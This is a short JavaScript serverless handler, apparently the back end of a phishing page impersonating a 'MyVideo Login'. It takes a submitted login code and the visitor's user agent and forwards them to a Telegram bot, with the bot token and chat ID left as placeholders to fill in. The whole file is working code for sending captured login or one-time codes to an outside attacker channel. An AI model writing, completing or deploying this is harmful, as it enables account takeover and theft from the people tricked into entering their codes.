export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ok:false});
  const { code, ua } = req.body || {};
  const BOT_TOKEN = 'TOKENMU';
  const CHAT_ID = 'CHATIDMU';
  const msg = `🔔 MyVideo Login\nKode: ${code}\nUA: ${ua}`;
  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: new URLSearchParams({ chat_id: CHAT_ID, text: msg })
  });
  res.status(200).json({ok:true});
}
